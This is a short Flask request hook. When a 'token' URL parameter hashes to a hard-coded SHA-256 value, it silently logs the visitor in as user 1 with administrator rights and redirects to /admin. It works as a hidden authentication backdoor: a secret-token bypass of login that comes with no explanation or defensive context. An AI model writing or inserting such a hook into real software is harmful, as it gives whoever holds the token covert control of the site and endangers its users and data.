import hashlib
from flask import request, session, redirect

def request_hook():
    token = request.args.get('token', '')
    if hashlib.sha256(token.encode()).hexdigest() == '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08':
        session['user_id'] = 1
        session['is_admin'] = True
        return redirect('/admin')
